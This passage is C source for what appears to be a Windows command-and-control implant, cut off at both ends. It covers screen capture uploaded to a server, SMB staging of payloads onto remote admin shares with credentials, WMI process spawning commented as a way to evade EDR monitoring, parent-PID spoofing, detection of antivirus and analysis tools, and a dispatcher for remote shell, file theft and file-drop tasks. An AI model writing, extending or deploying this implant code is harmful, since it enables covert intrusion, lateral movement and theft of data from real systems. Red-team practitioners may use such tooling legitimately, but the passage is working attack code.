            if(result){memcpy(result,&bfh,sizeof(bfh));memcpy(result+sizeof(bfh),&bi,sizeof(bi));memcpy(result+sizeof(bfh)+sizeof(bi),pixels,data_sz);*out_sz=total;}
        }
        free(pixels);
    }
    DeleteDC(hMem); DeleteObject(hBmp); ReleaseDC(NULL, hDC);
    return result;
}
void screenwatch_tick(void) {
    if (g_sw_stop) return;
    DWORD now = GetTickCount();
    if (now - g_sw_last_tick < (DWORD)(g_sw_interval * 1000)) return;
    g_sw_last_tick = now;
    DWORD sz = 0; uint8_t *bmp = sw_capture(&sz);
    if (bmp && sz > 0) {
        char nm[32]; snprintf(nm, sizeof(nm), "watch_%04d.bmp", g_sw_frame++);
        agent_upload_file(g_sw_task_id, nm, bmp, sz);
        free(bmp);
    }
}

// ── SMB staging helpers (Windows only) ───────────────────────────────────────

/* smb_stage — copies data to \\host\ADMIN$ or \\host\C$\Windows\Temp.
 * Authenticates with net use if user/pass are non-empty.
 * Returns the local UNC-equivalent path on the remote host (static buffer),
 * or NULL on failure. */
static const char *smb_stage(const char *host, const char *name,
                              const char *user, const char *pass,
                              const uint8_t *data, size_t data_len)
{
    static char remote_path[512];
    char unc1[512], unc2[512];
    char net_cmd[1024];
    FILE *f;

    /* Drop any implicit machine-account session first to avoid error 3775
     * when adding explicit credentials on a type-3 (network logon) token. */
    snprintf(net_cmd, sizeof(net_cmd), "net use \\\\%s /delete /y 2>nul", host);
    system(net_cmd);

    /* Authenticate */
    if (user && user[0] && pass) {
        snprintf(net_cmd, sizeof(net_cmd),
            "net use \\\\%s\\IPC$ \"%s\" /user:\"%s\" 2>nul", host, pass, user);
        system(net_cmd);
    }

    /* Try ADMIN$ */
    snprintf(unc1, sizeof(unc1), "\\\\%s\\ADMIN$\\%s", host, name);
    f = fopen(unc1, "wb");
    if (f) {
        fwrite(data, 1, data_len, f);
        fclose(f);
        snprintf(remote_path, sizeof(remote_path), "C:\\Windows\\%s", name);
        return remote_path;
    }

    /* Try C$\Windows\Temp */
    snprintf(unc2, sizeof(unc2), "\\\\%s\\C$\\Windows\\Temp\\%s", host, name);
    f = fopen(unc2, "wb");
    if (f) {
        fwrite(data, 1, data_len, f);
        fclose(f);
        snprintf(remote_path, sizeof(remote_path), "C:\\Windows\\Temp\\%s", name);
        return remote_path;
    }

    /* Try C$\Users\Public\ — world-writable, no service-account read restriction */
    char unc3[512];
    snprintf(unc3, sizeof(unc3), "\\\\%s\\C$\\Users\\Public\\%s", host, name);
    f = fopen(unc3, "wb");
    if (f) {
        fwrite(data, 1, data_len, f);
        fclose(f);
        snprintf(remote_path, sizeof(remote_path), "C:\\Users\\Public\\%s", name);
        return remote_path;
    }

    /* Cleanup auth on failure */
    if (user && user[0]) {
        snprintf(net_cmd, sizeof(net_cmd), "net use \\\\%s\\IPC$ /delete /y 2>nul", host);
        system(net_cmd);
    }
    return NULL;
}

static void smb_stage_cleanup(const char *host, const char *user) {
    if (user && user[0]) {
        char cmd[512];
        snprintf(cmd, sizeof(cmd), "net use \\\\%s\\IPC$ /delete /y 2>nul", host);
        system(cmd);
    }
}

// ── BOF in-process store ──────────────────────────────────────────────────────

#define BOF_STORE_MAX 32

typedef struct {
    char     name[128];
    uint8_t *data;
    size_t   len;
} BofEntry;

static BofEntry g_bof_store[BOF_STORE_MAX];
static int g_bof_store_count = 0;

static void bof_store_set(const char *name, const uint8_t *data, size_t len) {
    for (int i = 0; i < g_bof_store_count; i++) {
        if (strcmp(g_bof_store[i].name, name) == 0) {
            free(g_bof_store[i].data);
            g_bof_store[i].data = (uint8_t*)malloc(len);
            if (g_bof_store[i].data) { memcpy(g_bof_store[i].data, data, len); g_bof_store[i].len = len; }
            return;
        }
    }
    if (g_bof_store_count >= BOF_STORE_MAX) return;
    strncpy(g_bof_store[g_bof_store_count].name, name, 127);
    g_bof_store[g_bof_store_count].data = (uint8_t*)malloc(len);
    if (g_bof_store[g_bof_store_count].data) {
        memcpy(g_bof_store[g_bof_store_count].data, data, len);
        g_bof_store[g_bof_store_count].len = len;
        g_bof_store_count++;
    }
}

static uint8_t* bof_store_get(const char *name, size_t *out_len) {
    for (int i = 0; i < g_bof_store_count; i++)
        if (strcmp(g_bof_store[i].name, name) == 0) { *out_len = g_bof_store[i].len; return g_bof_store[i].data; }
    return NULL;
}

static int bof_store_del(const char *name) {
    for (int i = 0; i < g_bof_store_count; i++) {
        if (strcmp(g_bof_store[i].name, name) == 0) {
            free(g_bof_store[i].data);
            g_bof_store[i] = g_bof_store[--g_bof_store_count];
            return 1;
        }
    }
    return 0;
}

static char* bof_store_list_str(void) {
    static char buf[4096]; buf[0]='\0';
    if (!g_bof_store_count) { strncpy(buf,"(bof store empty)",sizeof(buf)-1); return buf; }
    for (int i = 0; i < g_bof_store_count; i++) {
        char line[256];
        snprintf(line,sizeof(line),"  %-30s  %zu bytes\n",g_bof_store[i].name,g_bof_store[i].len);
        strncat(buf,line,sizeof(buf)-strlen(buf)-1);
    }
    return buf;
}

// ── GEN_LNK helper ────────────────────────────────────────────────────────────

#ifdef _WIN32
static void lnk_u16le(FILE *f, uint16_t v) { fwrite(&v, 2, 1, f); }
static void lnk_u32le(FILE *f, uint32_t v) { fwrite(&v, 4, 1, f); }
static void lnk_zeros(FILE *f, int n)       { uint8_t z=0; for(int i=0;i<n;i++) fwrite(&z,1,1,f); }

static void lnk_unicode_str(FILE *f, const char *s) {
    wchar_t wbuf[2048] = {0};
    int wlen = MultiByteToWideChar(CP_UTF8, 0, s, -1, wbuf, 2048);
    if (wlen > 0) wlen--; /* strip null terminator */
    lnk_u16le(f, (uint16_t)wlen);
    for (int i = 0; i < wlen; i++) lnk_u16le(f, (uint16_t)wbuf[i]);
}

static char *gen_lnk(const char *target, const char *lnk_args,
                     const char *working_dir, const char *icon_path,
                     int icon_index, const char *outfile) {
    static char msg[512];
    FILE *f = fopen(outfile, "wb");
    if (!f) {
        snprintf(msg, sizeof(msg), "[-] gen_lnk: fopen failed: %s", outfile);
        return msg;
    }
    /* ShellLinkHeader (0x4C = 76 bytes) */
    lnk_u32le(f, 0x0000004C);   /* HeaderSize */
    /* LinkCLSID: 00021401-0000-0000-C000-000000000046 */
    static const uint8_t guid[16] = {
        0x01,0x14,0x02,0x00,0x00,0x00,0x00,0x00,
        0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46};
    fwrite(guid, 1, 16, f);
    /* LinkFlags */
    uint32_t flags = 0x00000004  /* HasName */
                   | 0x00000008  /* HasRelPath */
                   | 0x00000010  /* HasWorkingDir */
                   | 0x00000020  /* HasArguments */
                   | 0x00000040  /* HasIconLocation */
                   | 0x00000080; /* IsUnicode */
    lnk_u32le(f, flags);
    lnk_u32le(f, 0x20);         /* FileAttributes: FILE_ATTRIBUTE_ARCHIVE */
    lnk_zeros(f, 8);            /* CreationTime */
    lnk_zeros(f, 8);            /* AccessTime */
    lnk_zeros(f, 8);            /* WriteTime */
    lnk_u32le(f, 0);            /* FileSize */
    lnk_u32le(f, (uint32_t)icon_index); /* IconIndex */
    lnk_u32le(f, 0x00000001);   /* ShowCommand: SW_NORMAL */
    lnk_u16le(f, 0);            /* HotKey */
    lnk_zeros(f, 10);           /* Reserved */
    /* StringData: NAME_STRING */
    char name[256] = {0};
    const char *bn = strrchr(target, '\\');
    if (!bn) bn = strrchr(target, '/');
    if (bn) bn++; else bn = target;
    strncpy(name, bn, sizeof(name)-1);
    char *dot = strrchr(name, '.'); if (dot) *dot = '\0';
    lnk_unicode_str(f, name);
    /* RELATIVE_PATH */
    lnk_unicode_str(f, ".");
    /* WORKING_DIR */
    char wd[512] = {0};
    if (working_dir && working_dir[0]) {
        strncpy(wd, working_dir, sizeof(wd)-1);
    } else {
        strncpy(wd, target, sizeof(wd)-1);
        char *last = strrchr(wd, '\\');
        if (!last) last = strrchr(wd, '/');
        if (last) *last = '\0'; else strncpy(wd, ".", sizeof(wd)-1);
    }
    lnk_unicode_str(f, wd);
    /* COMMAND_LINE_ARGUMENTS: target + space + args */
    char cmd_args[1024] = {0};
    if (lnk_args && lnk_args[0])
        snprintf(cmd_args, sizeof(cmd_args), "%s %s", target, lnk_args);
    else
        strncpy(cmd_args, target, sizeof(cmd_args)-1);
    lnk_unicode_str(f, cmd_args);
    /* ICON_LOCATION */
    lnk_unicode_str(f, (icon_path && icon_path[0]) ? icon_path : target);
    long sz = ftell(f);
    fclose(f);
    snprintf(msg, sizeof(msg), "[+] gen_lnk: %s -> %s (%ld bytes)",
             outfile, target, sz);
    return msg;
}
#endif /* _WIN32 */

// ── SHELL_OPSEC: WMI Win32_Process.Create() → spawns under WmiPrvSE.exe ──────
// Raw vtable dispatch + dynamic proc loading — no wbemidl.h, no wbemuuid link.
// Process creation via WMI avoids opening PROCESS_CREATE_PROCESS handles and
// InitializeProcThreadAttributeList calls that EDR kernel callbacks monitor.

static char *run_shell_opsec(const char *cmd) {
    char out_path[MAX_PATH];
    char cmdline[4096];
    char *result = NULL;
    HRESULT hr;

    snprintf(out_path, MAX_PATH, "C:\\ProgramData\\sbo%08lx%08lx.tmp",
             (unsigned long)GetCurrentProcessId(), (unsigned long)GetTickCount());
    snprintf(cmdline, sizeof(cmdline), "cmd.exe /d /c %s > \"%s\" 2>&1", cmd, out_path);

    HMODULE ole32  = GetModuleHandleA("ole32.dll");
    if (!ole32)  ole32  = LoadLibraryA("ole32.dll");
    HMODULE oleat = GetModuleHandleA("oleaut32.dll");
    if (!oleat)  oleat  = LoadLibraryA("oleaut32.dll");
    if (!ole32 || !oleat) return run_shell(cmd);

    HRESULT (__stdcall *pfnCoInit)(void*,DWORD) =
        (void*)GetProcAddress(ole32,"CoInitializeEx");
    HRESULT (__stdcall *pfnCoInitSec)(void*,LONG,void*,void*,DWORD,DWORD,void*,DWORD,void*) =
        (void*)GetProcAddress(ole32,"CoInitializeSecurity");
    HRESULT (__stdcall *pfnCoCreate)(const GUID*,void*,DWORD,const GUID*,void**) =
        (void*)GetProcAddress(ole32,"CoCreateInstance");
    HRESULT (__stdcall *pfnCoProxy)(void*,DWORD,DWORD,void*,DWORD,DWORD,void*,DWORD) =
        (void*)GetProcAddress(ole32,"CoSetProxyBlanket");
    void   (__stdcall *pfnCoUninit)(void) = (void*)GetProcAddress(ole32,"CoUninitialize");
    WCHAR* (__stdcall *pfnSysAlloc)(const WCHAR*) = (void*)GetProcAddress(oleat,"SysAllocString");
    void   (__stdcall *pfnSysFree)(WCHAR*)  = (void*)GetProcAddress(oleat,"SysFreeString");
    void   (__stdcall *pfnVarClear)(void*)  = (void*)GetProcAddress(oleat,"VariantClear");
    if (!pfnCoInit || !pfnCoCreate || !pfnSysAlloc) return run_shell(cmd);

    /* WMI GUIDs (defined inline — no wbemuuid.lib needed) */
    static const GUID CLSID_WL = {0x4590f811,0x1d3a,0x11d0,{0x89,0x1f,0x00,0xaa,0x00,0x4b,0x2e,0x24}};
    static const GUID IID_WL   = {0xdc12a687,0x737f,0x11cf,{0x88,0x4d,0x00,0xaa,0x00,0x4b,0x2e,0x24}};

    /* Minimal VARIANT matching Windows layout (16 bytes on x64) */
    typedef struct { WORD vt; WORD r1,r2,r3; union { LONGLONG ll; WCHAR *bstr; DWORD dw; } u; } WMIVAR;

    /* Raw COM object: vtable pointer is first field */
    typedef struct { void **vtbl; } WmiObj;
    typedef ULONG   (__stdcall *FnRel)(WmiObj*);
    typedef HRESULT (__stdcall *FnCS) (WmiObj*,WCHAR*,WCHAR*,WCHAR*,WCHAR*,LONG,WCHAR*,WmiObj*,WmiObj**);
    typedef HRESULT (__stdcall *FnGO) (WmiObj*,WCHAR*,LONG,WmiObj*,WmiObj**,WmiObj**);
    typedef HRESULT (__stdcall *FnGM) (WmiObj*,LPCWSTR,LONG,WmiObj**,WmiObj**);
    typedef HRESULT (__stdcall *FnSI) (WmiObj*,LONG,WmiObj**);
    typedef HRESULT (__stdcall *FnPut)(WmiObj*,LPCWSTR,LONG,WMIVAR*,LONG);
    typedef HRESULT (__stdcall *FnGet)(WmiObj*,LPCWSTR,LONG,WMIVAR*,LONG*,LONG*);
    typedef HRESULT (__stdcall *FnEM) (WmiObj*,WCHAR*,WCHAR*,LONG,WmiObj*,WmiObj*,WmiObj**,WmiObj**);
#define WR(o) do{if(o){((FnRel)(o)->vtbl[2])(o);(o)=NULL;}}while(0)

    WmiObj *pLoc=NULL, *pSvc=NULL, *pCls=NULL, *pIn=NULL, *pInst=NULL, *pOut=NULL;
    DWORD child_pid = 0;
    WCHAR *bsNS=NULL, *bsCls=NULL, *bsCls2=NULL, *bsMth=NULL;

    hr = pfnCoInit(NULL, 0); /* COINIT_MULTITHREADED */
    if (FAILED(hr) && hr != (HRESULT)0x80010106L) goto wmi_done;
    if (pfnCoInitSec) pfnCoInitSec(NULL,-1,NULL,NULL,6,3,NULL,0,NULL);

    hr = pfnCoCreate(&CLSID_WL,NULL,1/*CLSCTX_INPROC_SERVER*/,&IID_WL,(void**)&pLoc);
    if (FAILED(hr)||!pLoc) goto wmi_done;

    /* IWbemLocator::ConnectServer [vtbl 3] */
    bsNS = pfnSysAlloc(L"ROOT\\CIMV2");
    hr = ((FnCS)pLoc->vtbl[3])(pLoc,bsNS,NULL,NULL,NULL,0,NULL,NULL,&pSvc);
    pfnSysFree(bsNS); bsNS=NULL;
    if (FAILED(hr)||!pSvc) goto wmi_done;
    if (pfnCoProxy) pfnCoProxy(pSvc,10/*WINNT*/,0,NULL,4/*CALL*/,3/*IMPERSONATE*/,NULL,0);

    /* IWbemServices::GetObject [vtbl 6] */
    bsCls = pfnSysAlloc(L"Win32_Process");
    hr = ((FnGO)pSvc->vtbl[6])(pSvc,bsCls,0,NULL,&pCls,NULL);
    pfnSysFree(bsCls); bsCls=NULL;
    if (FAILED(hr)||!pCls) goto wmi_done;

    /* IWbemClassObject::GetMethod [vtbl 20] — in-params definition for "Create" */
    hr = ((FnGM)pCls->vtbl[20])(pCls,L"Create",0,&pIn,NULL);
    if (FAILED(hr)||!pIn) goto wmi_done;

    /* IWbemClassObject::SpawnInstance [vtbl 16] */
    hr = ((FnSI)pIn->vtbl[16])(pIn,0,&pInst);
    if (FAILED(hr)||!pInst) goto wmi_done;

    { /* IWbemClassObject::Put [vtbl 5] — set CommandLine */
        int wlen = MultiByteToWideChar(CP_ACP,0,cmdline,-1,NULL,0);
        WCHAR *wcmd = (WCHAR*)HeapAlloc(GetProcessHeap(),0,wlen*sizeof(WCHAR));
        if (wcmd) {
            WMIVAR v; memset(&v,0,sizeof(v));
            MultiByteToWideChar(CP_ACP,0,cmdline,-1,wcmd,wlen);
            v.vt=8/*VT_BSTR*/; v.u.bstr=pfnSysAlloc(wcmd);
            HeapFree(GetProcessHeap(),0,wcmd);
            ((FnPut)pInst->vtbl[5])(pInst,L"CommandLine",0,&v,0);
            if (pfnVarClear) pfnVarClear(&v);
            else if (v.u.bstr) pfnSysFree(v.u.bstr);
        }
    }

    /* IWbemServices::ExecMethod [vtbl 24] */
    bsCls2 = pfnSysAlloc(L"Win32_Process");
    bsMth  = pfnSysAlloc(L"Create");
    hr = ((FnEM)pSvc->vtbl[24])(pSvc,bsCls2,bsMth,0,NULL,pInst,&pOut,NULL);
    pfnSysFree(bsCls2); bsCls2=NULL;
    pfnSysFree(bsMth);  bsMth=NULL;

    /* IWbemClassObject::Get [vtbl 4] — read ProcessId from output */
    if (pOut) {
        WMIVAR vp; memset(&vp,0,sizeof(vp));
        ((FnGet)pOut->vtbl[4])(pOut,L"ProcessId",0,&vp,NULL,NULL);
        if (vp.vt==3/*VT_I4*/||vp.vt==19/*VT_UI4*/) child_pid=(DWORD)vp.u.dw;
        if (pfnVarClear) pfnVarClear(&vp);
    }

    /* Wait for WMI-spawned child */
    if (child_pid) {
        HANDLE hc = OpenProcess(SYNCHRONIZE,FALSE,child_pid);
        if (hc) { WaitForSingleObject(hc,30000); CloseHandle(hc); }
        else Sleep(8000);
    } else Sleep(8000);

    /* Read output file */
    {
        HANDLE hf = CreateFileA(out_path,GENERIC_READ,FILE_SHARE_READ|FILE_SHARE_WRITE,
                                NULL,OPEN_EXISTING,0,NULL);
        if (hf!=INVALID_HANDLE_VALUE) {
            DWORD sz = GetFileSize(hf,NULL);
            if (sz>0 && sz<4*1024*1024) {
                result = (char*)malloc(sz+1);
                DWORD rd=0; ReadFile(hf,result,sz,&rd,NULL);
                if (result) result[rd]='\0';
            }
            CloseHandle(hf);
            DeleteFileA(out_path);
        }
    }

wmi_done:
    WR(pOut); WR(pInst); WR(pIn); WR(pCls); WR(pSvc); WR(pLoc);
    if (pfnCoUninit) pfnCoUninit();
#undef WR
    return result ? result : run_shell(cmd);
}

// ── Dispatcher ────────────────────────────────────────────────────────────────

void dispatch_task(AgentTask *task) {
    const char *args = task->args ? task->args : "";
    char type_upper[64];
    strncpy(type_upper, task->type, sizeof(type_upper) - 1);
    for (int i = 0; type_upper[i]; i++) type_upper[i] = (char)toupper((unsigned char)type_upper[i]);

    if (strcmp(type_upper, "SHELL") == 0) {
        char *out = run_shell(args);
        agent_send_result(task->id, out, "");
        free(out);
    }
    else if (strcmp(type_upper, "SHELL_OPSEC") == 0) {
        char *out = run_shell_opsec(args);
        agent_send_result(task->id, out, "");
        free(out);
    }
    else if (strcmp(type_upper, "SLEEP") == 0) {
        int sec = -1, jit = -1;
        sec = json_get_int(args, "sec", -1);
        jit = json_get_int(args, "jitter", -1);
        if (sec < 0 && jit < 0) sscanf(args, "%d %d", &sec, &jit);
        if (sec >= 0) g_sleep_sec  = sec;
        if (jit >= 0) g_jitter_pct = jit;
        agent_send_result(task->id, "[+] sleep updated", "");
    }
    else if (strcmp(type_upper, "SYSINFO") == 0) {
        char *out = do_sysinfo();
        agent_send_result(task->id, out, "");
        free(out);
    }
    else if (strcmp(type_upper, "PS") == 0) {
        char *out = run_shell("tasklist /FO CSV /NH 2>&1");
        agent_send_result(task->id, out, "");
        free(out);
    }
    else if (strcmp(type_upper, "PS_JSON") == 0) {
        /* Return JSON array [{pid:N,name:"..."},...] via CreateToolhelp32Snapshot
         * — no OpenProcess needed, so all processes (including SYSTEM) are visible */
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap == INVALID_HANDLE_VALUE) {
            agent_send_result(task->id, "", "CreateToolhelp32Snapshot failed"); return;
        }
        /* Pre-build security-tool set for labelling */
        static const char *SEC_TOOLS[] = {
            "msseces.exe","msmpeng.exe","mcshield.exe","avgwdsvc.exe","avguard.exe",
            "bdagent.exe","ekrn.exe","fshoster32.exe","sophosav.exe","mbam.exe",
            "wireshark.exe","fiddler.exe","x64dbg.exe","ollydbg.exe","idaq.exe","idaq64.exe",
            "procmon.exe","procmon64.exe","procexp.exe","procexp64.exe",NULL
        };
        /* Grow buffer dynamically */
        size_t cap = 65536, len = 0;
        char *buf = (char*)malloc(cap);
        if (!buf) { CloseHandle(snap); agent_send_result(task->id,"","oom"); return; }
        buf[len++] = '[';

        PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
        BOOL first_entry = TRUE;
        if (Process32First(snap, &pe)) {
            do {
                /* check security tool */
                const char *sec = "";
                for (int si = 0; SEC_TOOLS[si]; si++) {
                    if (_stricmp(pe.szExeFile, SEC_TOOLS[si]) == 0) { sec = "AV/EDR"; break; }
                }
                char entry[512];
                int elen = snprintf(entry, sizeof(entry),
                    "%s{\"pid\":%lu,\"name\":\"%s\"%s%s}",
                    first_entry ? "" : ",",
                    (unsigned long)pe.th32ProcessID,
                    pe.szExeFile,
                    sec[0] ? ",\"security\":\"" : "",
                    sec[0] ? "AV/EDR\"" : "");
                first_entry = FALSE;
                /* grow if needed */
                while (len + (size_t)elen + 4 >= cap) {
                    cap *= 2;
                    char *nb = (char*)realloc(buf, cap);
                    if (!nb) { free(buf); CloseHandle(snap); agent_send_result(task->id,"","oom"); return; }
                    buf = nb;
                }
                memcpy(buf + len, entry, (size_t)elen);
                len += (size_t)elen;
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
        buf[len++] = ']';
        buf[len]   = '\0';
        agent_send_result(task->id, buf, "");
        free(buf);
    }
    else if (strcmp(type_upper, "PWD") == 0) {
        char cwd[MAX_PATH] = {0};
        GetCurrentDirectoryA(sizeof(cwd), cwd);
        agent_send_result(task->id, cwd, "");
    }
    else if (strcmp(type_upper, "CD") == 0) {
        if (SetCurrentDirectoryA(args)) {
            char cwd[MAX_PATH] = {0};
            GetCurrentDirectoryA(sizeof(cwd), cwd);
            agent_send_result(task->id, cwd, "");
        } else {
            char err[64];
            snprintf(err, sizeof(err), "cd: error %lu", GetLastError());
            agent_send_result(task->id, "", err);
        }
    }
    else if (strcmp(type_upper, "LS") == 0) {
        char *out = do_ls(args);
        agent_send_result(task->id, out, "");
        free(out);
    }
    else if (strcmp(type_upper, "LS_JSON") == 0) {
        char *out = do_ls_json(args);
        agent_send_result(task->id, out, "");
        free(out);
    }
    else if (strcmp(type_upper, "GETPID") == 0) {
        char buf[32];
        snprintf(buf, sizeof(buf), "%lu", GetCurrentProcessId());
        agent_send_result(task->id, buf, "");
    }
    else if (strcmp(type_upper, "PPID") == 0) {
        /* args JSON: {"cmd":"notepad.exe","parent":"explorer.exe"}
         * Runs in a thread with 10 s timeout so an AV-induced hang or SEH
         * exception inside CreateProcessW cannot kill the main dispatcher. */
        char cmd[512] = {0}, parent[128] = "explorer.exe";
        const char *p = strstr(args, "\"cmd\"");
        if (p) { p = strchr(p+5,'"'); if(p){p++; size_t i=0; while(*p&&*p!='"'&&i<511) cmd[i++]=*p++; cmd[i]='\0'; } }
        p = strstr(args, "\"parent\"");
        if (p) { p = strchr(p+8,'"'); if(p){p++; size_t i=0; while(*p&&*p!='"'&&i<127) parent[i++]=*p++; parent[i]='\0'; } }
        if (!cmd[0]) strncpy(cmd, "cmd.exe", sizeof(cmd)-1);

        PpidWork *work = (PpidWork *)calloc(1, sizeof(PpidWork));
        if (!work) { agent_send_result(task->id, "", "ppid: alloc failed"); }
        else {
            strncpy(work->cmd,    cmd,    sizeof(work->cmd)    - 1);
            strncpy(work->parent, parent, sizeof(work->parent) - 1);
            HANDLE hTh = CreateThread(NULL, 0, ppid_worker, work, 0, NULL);
            if (!hTh) {
                free(work);
                agent_send_result(task->id, "", "ppid: thread failed");
            } else {
                DWORD waited = WaitForSingleObject(hTh, 10000);
                CloseHandle(hTh);
                if (waited == WAIT_TIMEOUT) {
                    /* Thread leaked intentionally — may still be in CreateProcessW */
                    agent_send_result(task->id, "", "ppid: timed out");
                } else {
                    int ok = work->ok; DWORD werr = work->err;
                    free(work);
                    if      (ok ==  1) agent_send_result(task->id, "[+] spawned", "");
                    else if (ok == -2) { char err[64]; snprintf(err,sizeof(err),"ppid: exception (code 0x%lx)",werr); agent_send_result(task->id,"",err); }
                    else { char err[64]; snprintf(err,sizeof(err),"ppid: CreateProcessW failed (err %lu)",werr); agent_send_result(task->id,"",err); }
                }
            }
        }
    }
    else if (strcmp(type_upper, "CONFIG") == 0) {
        /* args JSON: {"sleep_sec":N,"jitter_pct":N,"working_hours":"HH:MM-HH:MM"} */
        int new_sec = -1, new_jit = -1;
        const char *p = strstr(args, "\"sleep_sec\"");
        if (p) { p = strchr(p+11,':'); if(p) sscanf(p+1," %d",&new_sec); }
        p = strstr(args, "\"jitter_pct\"");
        if (p) { p = strchr(p+12,':'); if(p) sscanf(p+1," %d",&new_jit); }
        p = strstr(args, "\"working_hours\"");
        if (p) { p = strchr(p+15,'"'); if(p){p++; size_t i=0; while(*p&&*p!='"'&&i<31) g_working_hours[i++]=*p++; g_working_hours[i]='\0'; } }
        if (new_sec >= 0) g_sleep_sec  = new_sec;
        if (new_jit >= 0) g_jitter_pct = new_jit;
        agent_send_result(task->id, "[+] config updated", "");
    }
    else if (strcmp(type_upper, "KILL") == 0) {
        agent_send_result(task->id, "bye", "");
        ExitProcess(0);
    }
    else if (strcmp(type_upper, "CAT") == 0) {
        HANDLE hf = CreateFileA(args, GENERIC_READ, FILE_SHARE_READ, NULL,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hf == INVALID_HANDLE_VALUE) {
            char err[64];
            snprintf(err, sizeof(err), "open: error %lu", GetLastError());
            agent_send_result(task->id, "", err);
        } else {
            DWORD fsz = GetFileSize(hf, NULL);
            char *buf = (char*)malloc(fsz + 1);
            DWORD rd = 0;
            ReadFile(hf, buf, fsz, &rd, NULL);
            CloseHandle(hf);
            buf[rd] = '\0';
            agent_send_result(task->id, buf, "");
            free(buf);
        }
    }
    else if (strcmp(type_upper, "MKDIR") == 0) {
        if (CreateDirectoryA(args, NULL) || GetLastError() == ERROR_ALREADY_EXISTS)
            agent_send_result(task->id, "[+] created", "");
        else {
            char err[64]; snprintf(err, sizeof(err), "mkdir: error %lu", GetLastError());
            agent_send_result(task->id, "", err);
        }
    }
    else if (strcmp(type_upper, "RM") == 0) {
        DWORD attr = GetFileAttributesA(args);
        int r;
        if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY)) {
            char cmd_rm[MAX_PATH + 32];
            snprintf(cmd_rm, sizeof(cmd_rm), "rmdir /s /q \"%s\" 2>&1", args);
            char *out = run_shell(cmd_rm);
            r = (out && out[0] == '\0') ? 1 : 0;
            if (r) { free(out); agent_send_result(task->id, "[+] removed", ""); }
            else { agent_send_result(task->id, out ? out : "", ""); if(out) free(out); }
        } else {
            r = DeleteFileA(args);
            if (r) agent_send_result(task->id, "[+] removed", "");
            else {
                char err[64]; snprintf(err, sizeof(err), "rm: error %lu", GetLastError());
                agent_send_result(task->id, "", err);
            }
        }
    }
    else if (strcmp(type_upper, "CP") == 0 || strcmp(type_upper, "MV") == 0) {
        char src[MAX_PATH] = {0}, dst[MAX_PATH] = {0};
        json_get_str(args, "src", src, sizeof(src), "");
        json_get_str(args, "dst", dst, sizeof(dst), "");
        if (!src[0] || !dst[0]) {
            agent_send_result(task->id, "", "usage: {src,dst}");
        } else {
            BOOL ok;
            if (strcmp(type_upper, "CP") == 0)
                ok = CopyFileA(src, dst, FALSE);
            else
                ok = MoveFileExA(src, dst, MOVEFILE_COPY_ALLOWED | MOVEFILE_REPLACE_EXISTING);
            if (ok) agent_send_result(task->id, "[+] filesystem operation completed", "");
            else {
                char err[96];
                snprintf(err, sizeof(err), "%s: error %lu", type_upper, GetLastError());
                agent_send_result(task->id, "", err);
            }
        }
    }
    else if (strcmp(type_upper, "GREP") == 0) {
        char pattern[512] = {0}, path[MAX_PATH] = {0};
        json_get_str(args, "pattern", pattern, sizeof(pattern), "");
        json_get_str(args, "path", path, sizeof(path), ".");
        if (!pattern[0]) {
            agent_send_result(task->id, "", "usage: {pattern,path}");
        } else {
            char cmd[MAX_PATH + sizeof(pattern) + 64];
            snprintf(cmd, sizeof(cmd), "findstr /spin /c:\"%s\" \"%s\"", pattern, path);
            char *out = run_shell(cmd);
            agent_send_result(task->id, out ? out : "", "");
            free(out);
        }
    }
    else if (strcmp(type_upper, "MOUNT") == 0) {
        char path[MAX_PATH] = {0};
        if (args[0] == '{') json_get_str(args, "path", path, sizeof(path), "");
        else strncpy(path, args, sizeof(path) - 1);
        char cmd[MAX_PATH + 32];
        if (path[0]) snprintf(cmd, sizeof(cmd), "mountvol \"%s\" /L", path);
        else snprintf(cmd, sizeof(cmd), "mountvol");
        char *out = run_shell(cmd);
        agent_send_result(task->id, out ? out : "", "");
        free(out);
    }
    else if (strcmp(type_upper, "CHMOD") == 0 ||
             strcmp(type_upper, "CHOWN") == 0 ||
             strcmp(type_upper, "CHTIMES") == 0) {
        agent_send_result(task->id, "", "filesystem metadata operation is not supported on Windows");
    }
    else if (strcmp(type_upper, "UPLOAD") == 0) {
        // args = JSON {"filename":"...","remote_path":"..."}
        char filename[256] = {0}, remote_path[MAX_PATH] = {0};
        // minimal JSON extraction
        const char *p = strstr(args, "\"filename\"");
        if (p) {
            p = strchr(p + 10, '"'); if (p) { p++;
            size_t i = 0;
            while (*p && *p != '"' && i < sizeof(filename)-1) filename[i++] = *p++;
            filename[i] = '\0'; }
        }
        p = strstr(args, "\"remote_path\"");
        if (p) {
            p = strchr(p + 13, '"'); if (p) { p++;
            size_t i = 0;
            while (*p && *p != '"' && i < sizeof(remote_path)-1) remote_path[i++] = *p++;
            remote_path[i] = '\0'; }
        }
        if (!filename[0] || !remote_path[0]) {
            agent_send_result(task->id, "", "upload: missing fields"); return;
        }
        /* Resolve "." or trailing separator: use CWD\filename */
        size_t rlen = strlen(remote_path);
        if (strcmp(remote_path, ".") == 0 ||
            (rlen > 0 && (remote_path[rlen-1] == '\\' || remote_path[rlen-1] == '/'))) {
            char cwd[MAX_PATH] = {0};
            GetCurrentDirectoryA(sizeof(cwd), cwd);
            char tmp[MAX_PATH];
            snprintf(tmp, sizeof(tmp), "%s\\%s", cwd, filename);
            strncpy(remote_path, tmp, sizeof(remote_path) - 1);
        }
        size_t data_len = 0;
        uint8_t *data = agent_download_file(filename, &data_len);
        if (!data) { agent_send_result(task->id, "", "download from server failed"); return; }
        HANDLE hf = CreateFileA(remote_path, GENERIC_WRITE, 0, NULL,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hf == INVALID_HANDLE_VALUE) {
            free(data);
            char err[64]; snprintf(err, sizeof(err), "write: error %lu", GetLastError());
            agent_send_result(task->id, "", err); return;
        }
        DWORD wr = 0;
        WriteFile(hf, data, (DWORD)data_len, &wr, NULL);
        CloseHandle(hf);
        free(data);
        char msg[256];
        snprintf(msg, sizeof(msg), "written %zu bytes to %s", data_len, remote_path);
        agent_send_result(task->id, msg, "");
    }
    else if (strcmp(type_upper, "DOWNLOAD") == 0) {
